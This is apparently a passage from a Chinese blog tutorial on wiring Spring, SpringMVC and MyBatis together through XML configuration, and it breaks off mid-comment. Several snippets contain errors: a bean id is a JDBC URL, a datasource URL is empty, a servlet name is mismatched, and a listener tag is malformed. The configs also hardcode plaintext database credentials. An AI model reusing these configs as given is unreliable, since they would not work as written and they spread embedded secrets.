<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:tx</span>=<span class="string">&quot;http://www.springframework.org/schema/tx&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/aop/spring-aop.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/tx</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/tx/spring-tx.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 开启注解扫描，要扫描的是service和dao层的注解，要忽略web层注解，因为web层让SpringMVC框架</span></span><br><span class="line"><span class="comment">去管理 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;cn.itcast&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 配置要忽略的注解 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span></span></span><br><span class="line"><span class="tag">                                <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--	druid连接池--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    &amp;lt;!&amp;ndash;	用来操作数据源的操作模板 &amp;ndash;&amp;gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/spring1?characterEncoding=utf-8<span class="symbol">&amp;amp;</span>useSSL=falseTemplate&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.core.JdbcTemplate&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--	事务管理器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    1、配置事务增强 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;transactionManager&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 当方法被切点选中之后，不是直接被通知，还要过一次筛选 --&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 要增强的方法,query*开头的方法 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;query*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;SUPPORTS&quot;</span> <span class="attr">isolation</span>=<span class="string">&quot;DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;select*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;SUPPORTS&quot;</span> <span class="attr">isolation</span>=<span class="string">&quot;DEFAULT&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;transfer&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span> <span class="attr">isolation</span>=<span class="string">&quot;DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置切面 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;txPC&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* dm.demo..*.service.impl.*.*(..))&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--		事务引用+切面引用--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;txPC&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="SpringMVC环境"><a href="#SpringMVC环境" class="headerlink" title="SpringMVC环境"></a>SpringMVC环境</h3><ol>
<li>在web.xml中配置<code>DispatcherServlet</code>前端控制器</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.html<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    springMVC核心类</span></span><br><span class="line"><span class="comment">        配置前端控制器</span></span><br><span class="line"><span class="comment"> --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springDispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--     配置Servlet初始化参数,加载spring-mvc配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext-mvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        启动服务器，创建该servlet--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        所有请求交由springMVC的前端控制器DispatcherServlet处理</span></span><br><span class="line"><span class="comment">        / 静态动态web资源</span></span><br><span class="line"><span class="comment">        /* 动态web资源</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springDispatherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>在web.xml中配置<code>DispatcherServlet</code>过滤器解决中文乱码</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置解决中文乱码的过滤器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>characterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>characterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>编写springmvc.xml配置文件</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--扫描整个工程，但是只处理controller    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;dm&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span></span></span><br><span class="line"><span class="tag">                                <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    开启mvc的注解支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--开启默认的对静态资源文件访问支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    默认的解析jsp的视图解析器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/web/WEB-INF/jsp/&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;jackson2HttpMessageConverter&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">class</span>=<span class="string">&quot;org.springframework.http.converter.json.MappingJackson2HttpMessageConverter&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;messageConverters&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--               添加消息转化器--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;jackson2HttpMessageConverter&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;multipartResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 设置最大文件大小(单位KB) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxUploadSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1048576&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    配置异常处理器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sysExceptionResolver&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">class</span>=<span class="string">&quot;dm.demo.exception.SysExceptionResolver&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Spring整合SpringMVC框架"><a href="#Spring整合SpringMVC框架" class="headerlink" title="Spring整合SpringMVC框架"></a>Spring整合SpringMVC框架</h2><ol>
<li>在controller中能成功调用service对象中的方法</li>
<li>在项目启动时，就去applicationContext.xml配置文件，在web.xml中配置<code>ContextLoaderListener</code>监听器</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置Spring的监听器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">listener-</span>	 <span class="attr">class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listenerclass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置加载类路径的配置文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Spring整合MyBatis框架"><a href="#Spring整合MyBatis框架" class="headerlink" title="Spring整合MyBatis框架"></a>Spring整合MyBatis框架</h2><ol>
<li>编写mybatisconfig.xml配置文件</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">configuration</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--改变MyBatis运行时行为--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;STDOUT_LOGGING&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        开启赖加载功能--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;lazyLoadingEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        关闭积极的懒加载 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;aggressiveLazyLoading&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        二级缓存--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;cacheEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    自定义别名 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        单个别名定义--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">typeAlias</span> <span class="attr">type</span>=<span class="string">&quot;dm.demo.project.pojo.User&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;user&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--配置mybatis的环境--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--   配置mysql的环境--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--            配置事务的类型--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--            配置连接数据库的信息，用的是数据源(连接池)--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span></span></span><br><span class="line"><span class="tag">                          <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/spring1?characterEncoding=utf-8<span class="symbol">&amp;amp;</span>useSSL=false&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;86795462m&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    映射器 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    &lt;mappers&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        &lt;mapper resource=&quot;mappers/UserMapper.xml&quot;/&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        &lt;mapper resource=&quot;mappers/OrdersMapper.xml&quot;/&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    &lt;/mappers&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>编写mapper接口层，mappers.xml配置文件</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="meta">@CacheNamespace(blocking = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OrdersMapper</span> </span>&#123;</span><br><span class="line">    <span class="function">Orders <span class="title">queryOrdersByUserId</span><span class="params">(<span class="meta">@Param(value = &quot;userid&quot;)</span> <span class="keyword">int</span> id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;dm.demo.project.mapper.OrdersMapper&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryOrdersByUserId&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">resultType</span>=<span class="string">&quot;dm.demo.project.pojo.Orders&quot;</span>&gt;</span></span><br><span class="line">                select *from orders where user_id=#&#123;userid&#125;</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="整合MyBatis"><a href="#整合MyBatis" class="headerlink" title="整合MyBatis"></a>整合MyBatis</h3><p>把SqlMapConfig.xml配置文件中的内容配置到applicationContext.xml配置文件中</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--整合mybatis配置文件到spring--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        整合dataSource数据源 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;configuration&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--            整合setting对象--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.apache.ibatis.session.Configuration&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cacheEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;lazyLoadingEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;aggressiveLazyLoading&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        